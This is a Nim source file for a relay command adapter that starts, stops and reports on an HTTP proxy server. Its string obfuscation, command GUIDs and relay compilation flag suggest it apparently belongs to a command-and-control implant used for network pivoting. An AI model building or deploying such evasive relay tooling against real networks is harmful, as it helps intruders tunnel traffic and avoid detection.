#[
    Adapter: RelayCommandAdapter
    Wraps relay modules (proxy_server)
    Implements CommandModulePort to normalize interfaces
    Applies Dependency Inversion Principle
]#

import strutils, options
import ../../../domain/models/network_command_context
from ../../modules/relay/proxy_server import startProxyServer, stopProxyServer, isProxyServerRunning
from ../string_obfuscation_adapter import obf

type
    RelayCommandAdapter* = object
        ## Adapter for relay command modules
        discard

proc newRelayCommandAdapter*(): RelayCommandAdapter =
    ## Create a new RelayCommandAdapter instance
    result = RelayCommandAdapter()

proc executeCommand*(adapter: RelayCommandAdapter, cmd: string, args: seq[string], cmdGuid: string, ctx: Option[NetworkCommandContext]): string =
    ## Execute a relay command
    ## Handles relay-specific commands like port, status, stop
    if cmd != obf("relay"):
        return obf("ERROR: Unknown relay command: ") & cmd
    
    if args.len >= 2 and args[0] == "port":
        try:
            let port = parseInt(args[1])
            if port < 1 or port > 65535:
                return obf("ERROR: Invalid port number. Must be between 1-65535")
            else:
                let success = startProxyServer(port)
                if success:
                    return obf("SUCCESS: HTTP proxy server started on port ") & $port & obf("\nEndpoints available:\n- POST /proxy (main proxy endpoint)\n- GET /alive (health check)")
                else:
                    return obf("ERROR: Failed to start HTTP proxy server on port ") & $port
        except ValueError:
            return obf("ERROR: Invalid port number format")
    elif args.len >= 2 and args[0] == "connect":
        return obf("HTTP relay connect functionality removed - use RELAY_ADDRESS compilation flag instead")
    elif args.len >= 1 and args[0] == "status":
        if isProxyServerRunning():
            return obf("HTTP proxy server: RUNNING\nTCP relay: REMOVED (use HTTP relay only)")
        else:
            return obf("HTTP proxy server: STOPPED\nTCP relay: REMOVED (use HTTP relay only)")
    elif args.len >= 1 and args[0] == "stop":
        stopProxyServer()
        return obf("SUCCESS: HTTP proxy server stopped")
    elif args.len >= 1 and args[0] == "disconnect":
        return obf("HTTP relay disconnect functionality removed")
    else:
        return obf("HTTP relay commands available:\n- relay port <num> (start HTTP proxy server)\n- relay status (show server status)\n- relay stop (stop HTTP proxy server)")

